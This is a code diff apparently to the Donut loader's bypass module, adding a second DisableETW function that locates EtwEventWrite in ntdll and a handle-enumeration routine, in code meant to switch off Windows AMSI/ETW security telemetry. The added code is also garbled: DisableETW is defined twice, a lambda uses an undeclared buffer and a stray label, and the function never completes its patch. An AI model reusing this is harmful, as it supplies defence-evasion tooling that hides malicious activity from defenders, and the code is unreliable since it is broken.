@@ -29,23 +29,8 @@
   OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
 
-typedef enum _WLDP_HOST_ID { 
-   WLDP_HOST_ID_UNKNOWN     = 0,
-   WLDP_HOST_ID_GLOBAL      = 1,
-   WLDP_HOST_ID_VBA         = 2,
-   WLDP_HOST_ID_WSH         = 3,
-   WLDP_HOST_ID_POWERSHELL  = 4,
-   WLDP_HOST_ID_IE          = 5,
-   WLDP_HOST_ID_MSI         = 6,
-   WLDP_HOST_ID_MAX         = 7
-} WLDP_HOST_ID, *PWLDP_HOST_ID;
+#include "bypass.h"
 
-typedef struct _WLDP_HOST_INFORMATION {
-  DWORD        dwRevision;
-  WLDP_HOST_ID dwHostId;
-  PCWSTR       szSource;
-  HANDLE       hSource;
-} WLDP_HOST_INFORMATION, *PWLDP_HOST_INFORMATION;
 
 #if defined(BYPASS_AMSI_A)
 
@@ -417,3 +402,68 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
 
 }
 #endif
+
+
+BOOL DisableETW(PDONUT_INSTANCE inst) {
+    HMODULE dll;
+    DWORD   len, op, t;
+    LPVOID  cs;
+
+    // get a handle to ntdll.dll
+    dll = inst->api.LoadLibraryA(inst->ntdll);
+
+    // resolve address of EtwEventWrite
+    // if not found, return FALSE because it should exist
+    cs = inst->api.GetProcAddress(dll, inst->etwEventWrite);
+    if (cs == NULL) return FALSE;
+
+
+
+    EnumerateHandles([](PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle) -> NTSTATUS {
+
+        
+
+    EXIT:
+    if (buffer != NULL)
+        VirtualFree(buffer, 0, MEM_RELEASE);
+
+    return FALSE;
+
+    });
+
+    return TRUE;
+
+}
+
+NTSTATUS EnumerateHandles(ENUM_HANDLE_CALLBACK callback, PDONUT_INSTANCE inst)
+{
+    NTSTATUS                    status = STATUS_UNSUCCESSFUL;
+    PVOID                       buffer = NULL;
+    ULONG                       bufferSize = 0;
+
+    do {
+        status = inst->api.NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, &buffer, bufferSize, &bufferSize);
+        if (!NT_SUCCESS(status)) {
+            if (status == STATUS_INFO_LENGTH_MISMATCH) {
+                if (buffer != NULL)
+                    inst->api.VirtualFree(buffer, 0, MEM_RELEASE);
+                buffer = inst->api.VirtualAlloc(NULL, bufferSize, MEM_COMMIT, PAGE_READWRITE);
+                continue;
+            }
+            break;
+        }
+        else {
+            PSYSTEM_HANDLE_INFORMATION_EX handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)buffer;
+            for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
+                auto handle = &handleInfo->Handles[i];
+                status = callback(handle);
+                if (NT_SUCCESS(status))
+                    break;
+            }
+            break;
+        }
+    } while (true);
+    if (buffer != NULL)
+        inst->api.VirtualFree(buffer, 0, MEM_RELEASE);
+    return status;
+}
